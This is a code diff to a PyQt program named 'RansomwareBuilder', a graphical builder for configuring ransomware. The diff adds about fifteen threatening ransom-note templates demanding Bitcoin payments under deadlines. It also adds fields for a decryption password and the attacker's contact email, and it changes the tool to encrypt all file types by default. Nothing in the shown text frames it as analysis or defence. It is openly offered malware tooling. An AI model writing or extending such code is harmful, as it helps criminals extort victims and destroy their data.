@@ -26,13 +26,30 @@ class RansomwareBuilder(QMainWindow):
         
         layout.addWidget(QLabel('Ransom Note Message:'))
         self.message_combo = QComboBox(self)
-        self.message_combo.addItem("")
+        self.message_combo.setPlaceholderText("Select a ransom note message or enter your own.")
         self.message_combo.addItem("All your files have been encrypted. Pay 1 Bitcoin to address X to get the decryption key.")
         self.message_combo.addItem("Your files are locked. Send 0.5 Bitcoin to address Y to retrieve your files.")
         self.message_combo.addItem("Important data encrypted. Transfer 2 Bitcoin to address Z for decryption instructions.")
         self.message_combo.addItem("Your files have been taken hostage. Pay 1 Bitcoin to free them.")
         self.message_combo.addItem("Critical files encrypted. Pay 0.75 Bitcoin to address Y to recover them.")
         self.message_combo.addItem("Pay 1.5 Bitcoin to address Z to decrypt your important files.")
+        self.message_combo.addItem("Time is running out. Pay 2 Bitcoin to address A, or your files will be permanently deleted.")
+        self.message_combo.addItem("Your system has been compromised. Pay 3 Bitcoin to address B to restore your files.")
+        self.message_combo.addItem("Failure to pay 1 Bitcoin to address C within 24 hours will result in permanent data loss.")
+        self.message_combo.addItem("Your files have been encrypted. Pay 1.5 Bitcoin to address D or risk losing everything.")
+        self.message_combo.addItem("Your data is locked. Pay 2 Bitcoin to address E now to retrieve the decryption key.")
+        self.message_combo.addItem("This is your final warning. Pay 1 Bitcoin to address F or all your files will be erased.")
+        self.message_combo.addItem("Pay 2.5 Bitcoin to address G within 48 hours, or your files will be destroyed.")
+        self.message_combo.addItem("Your most important files are encrypted. Pay 1 Bitcoin to address H to unlock them.")
+        self.message_combo.addItem("Pay 3 Bitcoin to address I immediately to avoid permanent file deletion.")
+        self.message_combo.addItem("Your files are at risk. Pay 2 Bitcoin to address J now or lose everything.")
+        self.message_combo.addItem("Critical data encrypted. Pay 1 Bitcoin to address K to recover your files.")
+        self.message_combo.addItem("Your data will be lost forever unless 1.5 Bitcoin is paid to address L within 24 hours.")
+        self.message_combo.addItem("Act fast! Pay 2 Bitcoin to address M or face irreversible data loss.")
+        self.message_combo.addItem("Pay 1 Bitcoin to address N to retrieve your encrypted files before they are deleted.")
+        self.message_combo.addItem("Your system is under attack. Pay 2.5 Bitcoin to address O to restore your files immediately.")
+
+
         self.message_combo.currentIndexChanged.connect(self.update_ransom_message)
         layout.addWidget(self.message_combo)
         
@@ -43,11 +60,13 @@ class RansomwareBuilder(QMainWindow):
         layout.addWidget(QLabel('Decryption Password:'))
         self.decryption_password = QLineEdit(self)
         self.decryption_password.setEchoMode(QLineEdit.Password)
+        self.decryption_password.setPlaceholderText("Enter the decryption password (minimum 8 characters)")
         layout.addWidget(self.decryption_password)
         
         layout.addWidget(QLabel('Confirm Decryption Password:'))
         self.confirm_password = QLineEdit(self)
         self.confirm_password.setEchoMode(QLineEdit.Password)
+        self.confirm_password.setPlaceholderText("Confirm the decryption password")
         layout.addWidget(self.confirm_password)
         
         layout.addWidget(QLabel('Your Email:'))
@@ -55,8 +74,9 @@ class RansomwareBuilder(QMainWindow):
         self.email.setPlaceholderText("Enter your email address for contact.")
         layout.addWidget(self.email)
 
-        layout.addWidget(QLabel('File Extensions to Encrypt (comma-separated, e.g., .pdf,.jpeg):'))
+        layout.addWidget(QLabel('File Extensions to Encrypt (default is ALL):'))
         self.file_extensions = QLineEdit(self)
+        self.file_extensions.setPlaceholderText("e.g., .pdf,.jpeg (empty for all)")
         layout.addWidget(self.file_extensions)
         
         encryption_label = QLabel('Encryption: AES-256', self)
@@ -72,7 +92,6 @@ class RansomwareBuilder(QMainWindow):
         
         central_widget.setLayout(layout)
 
- 
         self.setStyleSheet("""
             QWidget {
                 background-color: #f7f7f7;
@@ -87,6 +106,9 @@ class RansomwareBuilder(QMainWindow):
                 border: 1px solid #ccc;
                 border-radius: 5px;
                 background-color: #fff;
+            }
+            QLineEdit::placeholder, QTextEdit::placeholder {
+                color: #888;
             }
             QPushButton {
                 background-color: #4CAF50;
